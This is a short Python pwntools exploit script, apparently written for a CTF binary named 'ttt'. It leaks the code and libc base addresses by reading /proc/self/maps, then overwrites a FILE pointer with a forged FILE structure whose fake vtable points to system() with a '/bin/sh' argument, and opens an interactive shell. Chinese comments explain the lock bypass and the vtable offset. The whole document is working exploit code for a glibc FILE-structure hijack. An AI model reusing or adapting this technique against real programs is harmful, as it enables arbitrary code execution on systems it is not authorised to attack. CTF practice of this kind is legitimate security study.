#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./ttt"
libc_binary = "/home/zh1x1an/src/glibc-2.23/64/lib/libc-2.23.so"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice :",str(idx))

def openfile(filename):
    opt(1)
    p.sendlineafter("Filename:",str(filename))

def read():
    opt(2)

def write():
    opt(3)

def ex(name):
    opt(4)
    p.sendlineafter("Leave your name :",str(name))

openfile("/proc/self/maps")
read()
write()
p.recvuntil("Data:00")
code_addr = int("0x"+ p.recvuntil("-",drop=True),16)
offset = 0x2020e0
buf_addr = code_addr + offset

read()
write()
p.recvuntil("heap]\n")
libc_addr = int("0x"+p.recvuntil("-",drop=True),16)
log.success("libc_addr is -> "+hex( libc_addr ))
log.success("buf_addr is -> "+hex( buf_addr ))

system_addr = libc_addr + libc.sym["system"]

lock_addr = buf_addr + 0x500
fake_vtable = buf_addr + 224


payload = flat([
    # "A"*8,";/bin/sh\x00;aaabbbb"
    0x0101010101010101,";/bin/sh\x00;aaabbbb" # system 第一个参数不能被 \x00 截断
    ]).ljust(0x88,"a")
payload += p64(lock_addr) # 绕过 _IO_acquire_lock (fp);
payload = payload.ljust(0xd8,"b") # 64 位下 vtable offset 是 0xd8
payload += p64(fake_vtable)
payload += p64(system_addr)*4 + p64(buf_addr) # 覆盖掉 struct data 的 FILE *fp ,使其指向 d.buf ,也就是我们可控的数据

gdb.attach(p,"b *0x400d4c\nset $g=0x6020e0")
ex(payload)

p.interactive()
